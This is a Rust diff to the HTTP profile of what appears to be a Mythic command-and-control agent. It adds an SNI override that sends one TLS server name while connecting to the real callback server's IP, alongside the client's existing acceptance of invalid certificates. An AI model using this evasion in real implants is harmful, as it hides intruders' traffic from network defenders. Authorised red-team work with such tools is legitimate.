@@ -50,6 +50,8 @@ pub struct HttpInitialConfig {
     pub proxy_user: String,
     #[serde(rename = "proxy_pass", default)]
     pub proxy_pass: String,
+    #[serde(rename = "sni", default)]
+    pub sni: String,
 }
 
 pub struct HttpProfile {
@@ -69,6 +71,10 @@ pub struct HttpProfile {
     proxy_port: AtomicI32,
     proxy_user: RwLock<String>,
     proxy_pass: RwLock<String>,
+    sni: RwLock<String>,
+    /// Cached resolved SocketAddr for the SNI resolve() mapping. Populated on first
+    /// send_message() call when an SNI override is configured, then reused.
+    sni_addr: RwLock<Option<std::net::SocketAddr>>,
     running: AtomicBool,
     should_stop: AtomicBool,
 }
@@ -118,6 +124,8 @@ impl HttpProfile {
             proxy_port: AtomicI32::new(config.proxy_port),
             proxy_user: RwLock::new(config.proxy_user),
             proxy_pass: RwLock::new(config.proxy_pass),
+            sni: RwLock::new(config.sni),
+            sni_addr: RwLock::new(None),
             running: AtomicBool::new(false),
             should_stop: AtomicBool::new(false),
         }
@@ -126,13 +134,24 @@ impl HttpProfile {
     fn get_base_url(&self) -> String {
         let host = self.callback_host.read().unwrap();
         let port = self.callback_port.load(Ordering::Relaxed);
-        // Match Poseidon's parseURLAndPort: omit default ports, ensure trailing slash
-        let url = if (port == 443 && host.starts_with("https://"))
-            || (port == 80 && host.starts_with("http://"))
-        {
-            host.to_string()
+        let sni = self.sni.read().unwrap();
+
+        // When SNI is set, swap the hostname in the URL with the SNI value so that
+        // reqwest/rustls uses it in the TLS ClientHello. build_client() adds a .resolve()
+        // override so the TCP connection still goes to the real callback_host IP.
+        let effective_host: String = if !sni.is_empty() {
+            let scheme = if host.starts_with("https://") { "https://" } else { "http://" };
+            format!("{}{}", scheme, sni)
         } else {
-            format!("{}:{}", host, port)
+            host.clone()
+        };
+
+        let url = if (port == 443 && effective_host.starts_with("https://"))
+            || (port == 80 && effective_host.starts_with("http://"))
+        {
+            effective_host
+        } else {
+            format!("{}:{}", effective_host, port)
         };
         if url.ends_with('/') { url } else { format!("{}/", url) }
     }
@@ -143,7 +162,7 @@ impl HttpProfile {
         format!("{}{}", base, uri)
     }
 
-    fn build_client(&self) -> reqwest::Client {
+    fn build_client(&self, sni_addr: Option<std::net::SocketAddr>) -> reqwest::Client {
         utils::print_debug("HTTP: Building new HTTP client");
         let mut builder = reqwest::Client::builder()
             .danger_accept_invalid_certs(true)
@@ -151,6 +170,19 @@ impl HttpProfile {
             .timeout(Duration::from_secs(30))
             .tcp_nodelay(true) // Disable Nagle's algorithm for lower latency
             .pool_idle_timeout(Some(Duration::from_secs(10)));
+
+        // SNI override: redirect the SNI hostname to the resolved callback_host address so
+        // the TLS ClientHello carries the SNI name while the TCP connection goes to the
+        // actual server. The address is resolved async in send_message() and cached.
+        let sni = self.sni.read().unwrap().clone();
+        if !sni.is_empty() {
+            if let Some(addr) = sni_addr {
+                utils::print_debug(&format!("HTTP: SNI override '{}' -> {}", sni, addr));
+                builder = builder.resolve(&sni, addr);
+            } else {
+                utils::print_debug("HTTP: SNI set but no resolved address yet — SNI redirect skipped this call");
+            }
+        }
 
         let proxy_host = self.proxy_host.read().unwrap();
         if !proxy_host.is_empty() {
@@ -264,9 +296,57 @@ impl HttpProfile {
         }
     }
 
+    /// Resolve the callback_host to a SocketAddr for the SNI .resolve() mapping.
+    /// Result is cached after the first successful lookup.
+    async fn resolve_sni_addr(&self) -> Option<std::net::SocketAddr> {
+        let sni = self.sni.read().unwrap().clone();
+        if sni.is_empty() {
+            return None;
+        }
+
+        // Return cached result if available
+        {
+            let cached = self.sni_addr.read().unwrap();
+            if cached.is_some() {
+                return *cached;
+            }
+        }
+
+        let host = self.callback_host.read().unwrap().clone();
+        let port = self.callback_port.load(Ordering::Relaxed) as u16;
+        let raw = host
+            .trim_start_matches("https://")
+            .trim_start_matches("http://")
+            .trim_end_matches('/');
+        let addr_str = if raw.contains(':') {
+            raw.to_string()
+        } else {
+            format!("{}:{}", raw, port)
+        };
+
+        match tokio::net::lookup_host(&addr_str).await {
+            Ok(mut addrs) => {
+                if let Some(addr) = addrs.next() {
+                    utils::print_debug(&format!("HTTP: Resolved callback_host '{}' -> {} (cached for SNI)", raw, addr));
+                    let mut cached = self.sni_addr.write().unwrap();
+                    *cached = Some(addr);
+                    Some(addr)
+                } else {
+                    utils::print_debug(&format!("HTTP: DNS lookup for '{}' returned no addresses", raw));
+                    None
+                }
+            }
+            Err(e) => {
+                utils::print_debug(&format!("HTTP: Failed to resolve callback_host '{}' for SNI mapping: {}", raw, e));
+                None
+            }
+        }
+    }
+
     /// Send a message to Mythic and return the response
     async fn send_message(&self, data: &[u8]) -> Option<Vec<u8>> {
-        let client = self.build_client();
+        let sni_addr = self.resolve_sni_addr().await;
+        let client = self.build_client(sni_addr);
         let url = self.get_post_url();
         let headers = self.build_headers();
         let encoded = self.encode_message(data);
